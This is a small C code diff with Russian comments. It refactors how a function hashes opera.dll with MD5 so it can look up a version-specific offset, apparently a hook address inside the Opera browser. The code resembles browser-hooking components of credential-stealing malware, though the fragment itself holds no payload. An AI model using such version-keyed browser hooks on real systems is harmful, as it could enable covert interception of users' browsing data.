@@ -373,19 +373,18 @@ LONG GetHookProcRVA(PCHAR DllName, HMODULE Module)
 	// Получаем полный путь к загруженной opera.dll и считаем её MD5-хеш
 
 	// Считаем хеш от файла
-	PCHAR Hash = CalcFileMD5HashAsBlob(DllName);
-	if (Hash)
+	TMD5 MD5;
+	if (MD5FromFileA(DllName, MD5))
 	{
 		for (int i = 0; i < OperaVerCount; i++)
 		{
 			// и сравниваем его с известными значениями
-			if (0 == m_memcmp(Hash, OperaMD5Hashes[i], 16))
+			if (0 == m_memcmp(MD5.Data, OperaMD5Hashes[i], MD5_HASH_SIZE))
 			{
 				res = (DWORD)Module + OperaVAOffsets[i];
 				break;
 			}
 		}
-		MemFree(Hash);
 	}
 
 	return res;
